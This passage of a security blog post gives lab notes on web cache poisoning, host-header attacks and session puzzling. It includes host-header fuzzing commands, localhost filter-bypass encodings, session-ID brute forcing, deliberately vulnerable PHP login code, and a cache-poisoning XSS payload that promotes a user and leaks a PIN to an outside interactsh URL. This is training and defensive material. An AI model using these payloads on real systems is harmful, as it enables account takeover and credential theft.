&lt;/VirtualHost&gt;
</pre></table></code></div></div><h3 id="override-headers"><span class="mr-2">Override Headers</span><a href="#override-headers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>X-Forwarded-Host X-HTTP-Host-Override Forwarded X-Host X-Forwarded-Server x-http-method-override: POST (overrides the method, check purge or head) content-type: s4yhii (test for invalid header make unavailable a web or repo) x-forwarded-scheme: http (make a content unavailable, combine with x-forwarded-host)</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240122173845.png" alt="" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240122174017.png" alt="" data-proofer-ignore></p><h3 id="auth-bypass-via-host-header"><span class="mr-2">Auth bypass via host header</span><a href="#auth-bypass-via-host-header" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>Change Host header to localhost to access admin areas<li>Fuzz for different ipv4 ips.<div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">for </span>a <span class="k">in</span> <span class="o">{</span>1..255<span class="o">}</span><span class="p">;</span><span class="k">do
  for </span>b <span class="k">in</span> <span class="o">{</span>1..255<span class="o">}</span><span class="p">;</span><span class="k">do
      </span><span class="nb">echo</span> <span class="s2">"192.168.</span><span class="nv">$a</span><span class="s2">.</span><span class="nv">$b</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> ips.txt
  <span class="k">done
done</span>
</pre></table></code></div></div></ul><div class="language-shell-session highlighter-rouge"><div class="code-header"> <span data-label-text="Shell-session"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">ffuf -u http://IP:PORT/admin.php -w ips.txt -H 'Host: FUZZ' -fs 752
</span></pre></table></code></div></div><h4 id="exercise"><span class="mr-2">Exercise</span><a href="#exercise" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240121122456.png" alt="" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240121123223.png" alt="" data-proofer-ignore> <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240121123236.png" alt="" data-proofer-ignore></p><h3 id="password-reset-poisoning"><span class="mr-2">Password Reset Poisoning</span><a href="#password-reset-poisoning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Send a request with the email of the victim and a manipulated host header that points to a domain under our control. The webapp uses the manipulated host header to construct the password reset link such that the link points to our domain. When the victim now clicks the password reset link, we will be able to see the request on our domain.</p><h4 id="exercise-1"><span class="mr-2">Exercise</span><a href="#exercise-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Sending http request with an override host header like X-Forwarded-Host pointing to our controlled server and the email of the victim (admin account) <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240121125017.png" alt="" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240121125116.png" alt="" data-proofer-ignore></p><p>Use this url to change the admin password.</p><h3 id="web-cache-poisoning-1"><span class="mr-2">Web cache poisoning</span><a href="#web-cache-poisoning-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If you have web cache poison in a login.php endpoint, you can use override headers to point to a server u own and exfiltrate the creds, use GET parameter to posing the cache.</p><h4 id="exercice"><span class="mr-2">Exercice</span><a href="#exercice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>First we enter a cache buster to test this attack, to send to the admin we will erase this cache buster, and we add X-Host header to override the host header in the response, this can lead to posing the action form and send the creds with us</p><p><strong>The admin accesses the URL http://admin.hostheaders.htb/login.php</strong></p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240121144553.png" alt="" data-proofer-ignore></p><p>Final POC Request to steal admin creds</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240121144812.png" alt="" data-proofer-ignore></p><h3 id="exercice-bypass-flawed-validation"><span class="mr-2">Exercice Bypass flawed validation</span><a href="#exercice-bypass-flawed-validation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Bypassing blacklist filters for <code class="language-plaintext highlighter-rouge">localhost</code>:</p><ul><li>Decimal encoding: 2130706433<li>Hex encoding: 0x7f000001<li>Octal encoding: 0177.0000.0000.0001<li>Zero: 0<li>Short form: 127.1<li>IPv6: ::1<li>External domain that resolves to localhost: localtest.me</ul><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240122033143.png" alt="" data-proofer-ignore></p><h1 id="session-puzzling">Session Puzzling</h1><p>Stateful: Set-Cookie: PHPSESSID=hvplcmsh88ja77r3dutanmn68u; Stateless: Set-Cookie: auth_token=eyfefefJ…….</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">require_once</span> <span class="p">(</span><span class="s1">'db.php'</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>

<span class="c1">// login</span>
<span class="k">if</span><span class="p">(</span><span class="nf">check_password</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
	<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">get_user_id</span><span class="p">(</span><span class="nv">$username</span><span class="p">);</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: profile.php"</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	<span class="k">echo</span> <span class="s2">"Unauthorized"</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// logout</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'logout'</span><span class="p">]))</span> <span class="p">{</span>
	<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>user_id is set to zero when logging out, so if zero is a valid user id, for instance for the admin user, the user could access /profile.php and find that he is logged as admin user.</p><h2 id="weak-session-ids"><span class="mr-2">Weak session IDs</span><a href="#weak-session-ids" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c">#create wordlist with 4 characters</span>
crunch 4 4 <span class="s2">"abcdefghijklmnopqrstuvwxyz1234567890"</span> <span class="nt">-o</span> wordlist.txt

<span class="c">#fuzz for weak session ids</span>
ffuf <span class="nt">-u</span> http://127.0.0.1/profile.php <span class="nt">-b</span> <span class="s1">'sessionID=FUZZ'</span> <span class="nt">-w</span> wordlist.txt <span class="nt">-fc</span> 302 <span class="nt">-t</span> 10
</pre></table></code></div></div><p>To analyze the entropy of session IDs, we can use <code class="language-plaintext highlighter-rouge">Burp Sequencer</code>. To do so, we right-click the login request in Burp and click on <code class="language-plaintext highlighter-rouge">Send to Sequencer</code>. Afterward, switch to the Sequencer Tab. Make sure that Burp automatically detected the session cookie in the <code class="language-plaintext highlighter-rouge">Token Location Within Response</code> field and that the <code class="language-plaintext highlighter-rouge">Cookie</code> option is selected. We could also specify a custom location if we wanted to analyze the entropy of a different field in the response. Afterward, start the live capture.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240129045207.png" alt="" data-proofer-ignore></p><h2 id="common-session-variables-auth-bypass"><span class="mr-2">Common Session Variables (Auth Bypass)</span><a href="#common-session-variables-auth-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>1ST takeaway: In multi step reset password flow, if the flow has 3 steps, omit the second step, usually verification (2fa, sms, etc) and reset the pass with the third step.</p><p>2ND takeaway:  enter <code class="language-plaintext highlighter-rouge">Forgot Password?</code> and enter the username <code class="language-plaintext highlighter-rouge">admin</code>. Afterward, access the post-login endpoint at <code class="language-plaintext highlighter-rouge">/profile.php</code> directly. We are now logged in as the admin user by exploiting our first session puzzling vulnerability. This happens because of this code</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nt">&lt;SNIP&gt;</span>

if(isset($_POST['Submit'])){
	$_SESSION['Username'] = $_POST['Username'];
	header("Location: reset_2.php");
	exit;
}

<span class="nt">&lt;SNIP&gt;</span>
</pre></table></code></div></div><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nt">&lt;SNIP&gt;</span>

if(!isset($_SESSION['Username'])){
    header("Location: login.php");
	exit;
  }

<span class="nt">&lt;SNIP&gt;</span>
</pre></table></code></div></div><p>See that the session variable username is set by forgot password flow and the auth code only checks if the variable is set.</p><h4 id="exercise-2"><span class="mr-2">Exercise</span><a href="#exercise-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Send a request with admin user in forgot password, remember the cookie <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240129055657.png" alt="" data-proofer-ignore></p><p>the user is set to admin in this session cookie, so we only need to visit profile.php with this cookie without authentication.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240129055741.png" alt="" data-proofer-ignore></p><h2 id="premature-session-population-auth-bypass"><span class="mr-2">Premature Session Population (Auth Bypass)</span><a href="#premature-session-population-auth-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The login process sets the session variables that determine whether a user is authenticated or not before the result of the authentication is known, which is before the user’s password is checked. The variables are only unset if the redirect to <code class="language-plaintext highlighter-rouge">/login.php?failed=1</code> is sent</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Submit'</span><span class="p">])){</span>
	<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">];</span>
	<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'Active'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>

	<span class="c1">// check user credentials</span>
	<span class="k">if</span><span class="p">(</span><span class="nf">login</span><span class="p">(</span><span class="nv">$Username</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Password'</span><span class="p">]))</span> <span class="p">{</span>
	    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: profile.php"</span><span class="p">);</span>
	    <span class="k">exit</span><span class="p">;</span>

	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: login.php?failed=1"</span><span class="p">);</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'failed'</span><span class="p">]))</span> <span class="p">{</span>
	<span class="nb">session_destroy</span><span class="p">();</span>
    <span class="nb">session_start</span><span class="p">();</span>
<span class="p">}</span>
</pre></table></code></div></div><h4 id="exercise-3"><span class="mr-2">Exercise</span><a href="#exercise-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Change failed= 1 with success=1 <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240130060742.png" alt="" data-proofer-ignore> <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240130082705.png" alt="" data-proofer-ignore></p><h2 id="common-session-variables-account-takeover"><span class="mr-2">Common Session Variables (Account Takeover)</span><a href="#common-session-variables-account-takeover" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This session puzzling vulnerability is the result of the re-use of the same session variable to store the phase of two different processes. If these processes are executed concurrently, it is possible to skip the security question of the password reset process, thus leading to account takeover.</p><p>Exercise: primero ir a register colocar admin en register_1, luego ir a reset_1 colocar admin, seguir con register_2 y aceptar. Saltar a reset_3 y configurar la nueva password. Al ingresar piden MFA, por ello volveremos a register_1 para hacer register_1 y register_2, finalmente volveremos al MFA y entraremos a profile.php.</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240211073537.png" alt="" data-proofer-ignore></p><h1 id="prevention">Prevention</h1><p>Never set sessionid by default to 0, when log out for example.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="c1">// login</span>
<span class="k">if</span><span class="p">(</span><span class="nf">check_password</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
	<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">get_user_id</span><span class="p">(</span><span class="nv">$username</span><span class="p">);</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: profile.php"</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	<span class="k">echo</span> <span class="s2">"Unauthorized"</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// logout</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'logout'</span><span class="p">]))</span> <span class="p">{</span>
	<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Common Session Variables</p><p>never re-use session variables for different processes on the web application since it can be hard to keep track of how the different processes intertwine and may be combined to bypass certain checks. Additionally, a separate session variable should be used to keep track of whether a user is currently logged in. Following is a simple improved example:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Submit'</span><span class="p">])){</span>
    <span class="k">if</span><span class="p">(</span><span class="nf">login</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Password'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'auth_username'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">];</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'is_logged_in'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>

        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: profile.php"</span><span class="p">);</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="o">&lt;</span><span class="no">SNIP</span><span class="o">&gt;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Premature population</p><p> Due to the premature population of the session variables, the user is thus considered logged in by the web server before the password is checked. This can easily be prevented by ensuring that the session variables are not populated prematurely, but only after the login process has been completed:  ```php if(isset($_POST[‘Submit’])){ $_SESSION[‘login_fail_user’] = $_POST[‘Username’];</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>if(login($_POST['Username'], $_POST['Password'])) {
    $_SESSION['auth_username'] = $_POST['Username'];
    $_SESSION['is_logged_in'] = true;
    header("Location: profile.php");
    exit;

} else {
    header("Location: login.php?failed=1");
    exit;
} } if (isset($_GET['failed'])) {
echo "Login failed for user " . $_SESSION['login_fail_user'];
session_start();
session_unset()
session_destroy(); } ``` - Completely unset session variables instead of setting a default value at re-initialization - Use a single session variable only for a single, dedicated purpose - Only populate a session variable if all prerequisites are fulfilled and the corresponding process is complete
</pre></table></code></div></div><h1 id="skill-assessment">Skill Assessment</h1><h2 id="easy"><span class="mr-2">Easy</span><a href="#easy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Login with you normal creds</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240211075912.png" alt="" data-proofer-ignore></p><p>You cant access admin area</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240211075940.png" alt="" data-proofer-ignore></p><p>In order to populate the username variable we use reset password function</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240211080024.png" alt="" data-proofer-ignore></p><p>After clic in submit the flag appears</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240211080105.png" alt="" data-proofer-ignore></p><h2 id="hard"><span class="mr-2">Hard</span><a href="#hard" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After loggin with normal creds we see this message <img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240211080641.png" alt="" data-proofer-ignore> so we now have a clue where to poison the cache, we see the parameters sort_by and utm_source, sort_by is unkeyed, so we use this via parameter cloacking to poison the cache, also we verifiy where is injected our payload to make the correct one</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="err">/admin/users.html?sort_by=role&amp;utm_source=users.html;sort_by=")&lt;/script&gt;&lt;script&gt;var+xhr+%3d+new+XMLHttpRequest()%3bxhr.open('GET',+'/admin/promote%3fuid%3d2',+true),xhr.send()%3b&lt;/script&gt;
</span></pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240211085553.png" alt="" data-proofer-ignore></p><p>Then for the other part, we need to exfiltrate the pin, we found the <strong>Forwarded</strong> Header is unkeyed and is reflected in response so we use this header to inject our interactsh.local url without the cache buster a=xd.and refresh=1</p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240211085835.png" alt="" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240211090344.png" alt="" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240211090326.png" alt="" data-proofer-ignore></p><p><img data-src="https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/wcp/Pasted%20image%2020240211090354.png" alt="" data-proofer-ignore></p><p>Get the flag. 🎉 Thanks for read, Happy hacking and always try harder!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web-security/'>Web Security</a>, <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web-security/" class="post-tag no-text-decoration" >web security</a> <a href="/tags/labs/" class="post-tag no-text-decoration" >labs</a> <a href="/tags/owasp/" class="post-tag no-text-decoration" >owasp</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Web+Cache+Poisoning+Techniques+-+s4yhii%27s+Blog&url=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FWeb-Cache-Poisoning%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Web+Cache+Poisoning+Techniques+-+s4yhii%27s+Blog&u=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FWeb-Cache-Poisoning%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FWeb-Cache-Poisoning%2F&text=Web+Cache+Poisoning+Techniques+-+s4yhii%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Tickets-popcorn-please/">Tickets and Popcorn please!, The Day main.js Became the Key Vault</a><li><a href="/posts/CyberApocalypse-CTF2025-Web/">Cyber Apocalypse 2025 - 6x Web Challenges Writeup</a><li><a href="/posts/CyberApocalypse-CTF2024-Web/">Cyber Apocalypse 2024 - 4x Web Challenges Writeup</a><li><a href="/posts/Web-Cache-Poisoning/">Web Cache Poisoning Techniques</a><li><a href="/posts/HTB-Cyber-Apocalypse-CTF-Web-Writeups/">Cyber Apocalypse 2023 2x Web Challenges Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web-security/">web security</a> <a class="post-tag" href="/tags/owasp/">owasp</a> <a class="post-tag" href="/tags/labs/">labs</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/cms/">cms</a> <a class="post-tag" href="/tags/python/">python</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Web-Challenges-HTB/"><div class="card-body"> <em class="small" data-ts="1656691200" data-df="ll" > Jul 1, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Web Challenges</h3><div class="text-muted small"><p> Templated Dificulty: easy Description: Can you exploit this simple mistake? Solution First we visit the site and see that uses jinja2, this template is susceptible to SSTI attacks. We s...</p></div></div></a></div><div class="card"> <a href="/posts/OS-Command-Injection-Labs/"><div class="card-body"> <em class="small" data-ts="1654876800" data-df="ll" > Jun 10, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Os Command Injection Labs</h3><div class="text-muted small"><p> OS command injection allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its ...</p></div></div></a></div><div class="card"> <a href="/posts/AWS-Cloudgoat-Lab/"><div class="card-body"> <em class="small" data-ts="1673366400" data-df="ll" > Jan 10, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cloudgoat rce_web_app scenario</h3><div class="text-muted small"><p> Cloudgoat RCE_WEB_APP Scenario Introduction CloudGoat is a training and learning platform developed by Rhino Security Labs to help individuals and organizations understand the risks and vulnerabil...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/AWS-Cloudgoat-Lab/" class="btn btn-outline-primary" prompt="Older"><p>Cloudgoat rce_web_app scenario</p></a> <a href="/posts/CyberApocalypse-CTF2024-Web/" class="btn btn-outline-primary" prompt="Newer"><p>Cyber Apocalypse 2024 - 4x Web Challenges Writeup</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "s4yhii/s4yhii.github.io", "data-repo-id": "R_kgDOHtsc-g", "data-category": "Announcements", "data-category-id": "DIC_kwDOHtsc-s4CQh10", "data-mapping": "title", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "top", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2025 <a 